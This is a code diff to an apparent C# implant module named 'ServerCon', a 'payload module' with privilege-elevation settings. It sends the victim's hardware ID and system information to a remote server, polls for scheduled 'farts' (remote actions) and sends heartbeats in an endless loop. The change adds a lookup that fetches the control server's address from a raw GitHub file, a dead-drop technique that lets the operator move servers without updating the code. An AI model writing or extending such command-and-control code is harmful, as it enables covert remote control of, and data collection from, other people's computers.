@@ -9,7 +9,7 @@ namespace zort
 {
     public class ServerCon : IPayloadModule
     {
-        private const string SERVER_URL = "localhost:3000";
+        private const string DEFAULT_SERVER_URL = "localhost:3000";
         private readonly Thread ServerThread = new Thread(ServerRoutine);
 
         public ElevationType ElevationType => ElevationType.Both;
@@ -37,8 +37,32 @@ namespace zort
             string HWID = SysInfoHelper.HWID();
             SystemInfo info = SysInfoHelper.Get();
 
+            //get server url from github
+            const string GITHUB_URL = "https://raw.githubusercontent.com/ZKitap/zortie/refs/heads/main/server.dat";
+            string SERVER_URL = DEFAULT_SERVER_URL;
+            using (HttpClient client = new HttpClient())
+            {
+                try
+                {
+                    var res = await client.GetAsync(GITHUB_URL);
+                    if (res.IsSuccessStatusCode)
+                    {
+                        var serverUrl = await res.Content.ReadAsStringAsync();
+                        SERVER_URL = serverUrl.Trim();
+                    }
+                    else
+                    {
+                        ModuleLogger.Log(typeof(ServerCon), "Failed to fetch server URL from GitHub.");
+                    }
+                }
+                catch (Exception ex)
+                {
+                    ModuleLogger.Log(typeof(ServerCon), $"Error fetching server URL: {ex.Message}");
+                }
+            }
+
         sendSysData:
-            var response = await SendRequestAsync("/log", new { hwid = HWID, sysdata = JsonConvert.SerializeObject(info) });
+            var response = await SendRequestAsync(SERVER_URL, "/log", new { hwid = HWID, sysdata = JsonConvert.SerializeObject(info) });
             if (response.IsSuccessStatusCode)
             {
                 ModuleLogger.Log(typeof(ServerCon), "System info sent successfully.");
@@ -51,7 +75,7 @@ namespace zort
             }
 
         getScheduledFarts:
-            response = await SendRequestAsync("/getFarts", new { hwid = HWID });
+            response = await SendRequestAsync(SERVER_URL, "/getFarts", new { hwid = HWID });
             if (!response.IsSuccessStatusCode)
             {
                 ModuleLogger.Log(typeof(ServerCon), "Failed to receive scheduled farts. Retrying in 5 seconds...");
@@ -98,19 +122,19 @@ namespace zort
             }
 
         sendHeartbeat:
-            await SendRequestAsync("/heartbeat", new { hwid = HWID });
+            await SendRequestAsync(SERVER_URL, "/heartbeat", new { hwid = HWID });
             await Task.Delay(1500);
             goto getScheduledFarts;
         }
 
-        static async Task<HttpResponseMessage> SendRequestAsync(string endpoint, dynamic data)
+        static async Task<HttpResponseMessage> SendRequestAsync(string url, string endpoint, dynamic data)
         {
             using (HttpClient client = new HttpClient())
             {
                 try
                 {
                     // Construct the URL with query parameters from the data object
-                    var requestUrl = $"http://{SERVER_URL}{(endpoint.StartsWith("/") ? endpoint : "/" + endpoint)}?";
+                    var requestUrl = $"http://{url}{(endpoint.StartsWith("/") ? endpoint : "/" + endpoint)}?";
                     foreach (var property in data.GetType().GetProperties())
                     {
                         requestUrl += $"{property.Name}={property.GetValue(data)}&";
